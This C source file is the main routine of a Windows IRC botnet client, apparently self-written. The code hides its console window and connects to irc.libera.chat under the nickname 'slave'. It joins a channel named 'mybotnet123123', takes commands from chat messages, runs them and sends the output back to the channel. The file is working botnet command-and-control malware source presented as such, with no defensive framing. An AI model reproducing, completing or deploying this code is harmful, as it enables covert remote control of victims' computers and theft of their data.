#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>       // Socket connection
#include <windows.h>        // WinAPI calls
#include <ws2tcpip.h>       // TCP-IP Sockets
#include <stdio.h>
#include <string.h>
#include "header.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "crypt32.lib")




#define DEBUG 0
 
int main(int argc, char* argv[]) {
    if (!DEBUG) {
        HWND hwnd = GetConsoleWindow();  // 获取控制台窗口句柄
        if (hwnd) {
            ShowWindow(hwnd, SW_HIDE);   // 隐藏窗口
        }
    }

    const char* owner = "#mybotnet123123";
    const char* channel = "#mybotnet123123";


    int reconnectAttempts = 0;

    while (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS) {
        SOCKET ircsock = TCPhandler("irc.libera.chat", "slave");
        if (ircsock == INVALID_SOCKET) {
            printf("Failed to connect to IRC server. Attempt %d of %d...\n",
                reconnectAttempts + 1, MAX_RECONNECT_ATTEMPTS);
            reconnectAttempts++;
            Sleep(RECONNECT_INTERVAL);
            continue;
        }

        // 自动加入频道
        
        char joinCmd[128];
        snprintf(joinCmd, sizeof(joinCmd), "JOIN %s\r\n", channel);
        send(ircsock, joinCmd, (int)strlen(joinCmd), 0);
        printf("[+] 已加入频道: %s\n", channel);

        // 发送上线提醒
        char notice[512];
        snprintf(notice, sizeof(notice), "PRIVMSG %s :Bot is online!\r\n", owner);
        send(ircsock, notice, (int)strlen(notice), 0);

        char buf[4096];
        MessageBuffer msgBuffer;

        while (1) {
            int n = recv(ircsock, buf, sizeof(buf) - 1, 0);
            if (n <= 0) {
                printf("Connection closed by server.\n");
                closesocket(ircsock);
                break;
            }

            buf[n] = '\0';  // Null-terminate
            printf("Received:\n%s\n", buf);

            // 处理 PING/PONG
            if (strncmp(buf, "PING", 4) == 0) {
                char pong[512];
                snprintf(pong, sizeof(pong), "PONG%s\r\n", buf + 4);
                send(ircsock, pong, (int)strlen(pong), 0);
                continue;
            }

            // 查找 PRIVMSG
            char* privmsg = strstr(buf, "PRIVMSG");
            if (privmsg != NULL) {

                // 查找消息内容起始位置（第一个 ':' 后）
                char* colon = strchr(privmsg, ':');
                if (colon != NULL) {
                    char* command = colon + 1;

                    // 去除前后空白字符
                    char* end = command + strlen(command);
                    while (end > command && (*(end - 1) == '\r' || *(end - 1) == '\n' || *(end - 1) == ' '))
                        end--;
                    *end = '\0';

                    // 初始化消息缓冲区
                    initMessageBuffer(&msgBuffer, owner);

                    // 解析并执行命令
                    ParsedCommand parsedCmd = parsecommand(command);
                    char* result = execute_parsed_command(parsedCmd, ircsock);

                    if (result) {
                        char* resultCopy = strdup(result);
                        char* token;
                        char* context = NULL;
                        token = strtok_s(resultCopy, "\n", &context);

                        while (token != NULL) {
                            appendToBuffer(&msgBuffer, ircsock, token);
                            token = strtok_s(NULL, "\n", &context);
                        }

                    
                        flushBuffer(&msgBuffer, ircsock);

                        free(resultCopy);
                        free(result);
                    }
                }
            }

            memset(buf, 0, sizeof(buf));
        }

        reconnectAttempts++;
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
            printf("Reconnecting in %d seconds...\n", RECONNECT_INTERVAL / 1000);
            Sleep(RECONNECT_INTERVAL);
        }
    }

    WSACleanup();
    return 0;
}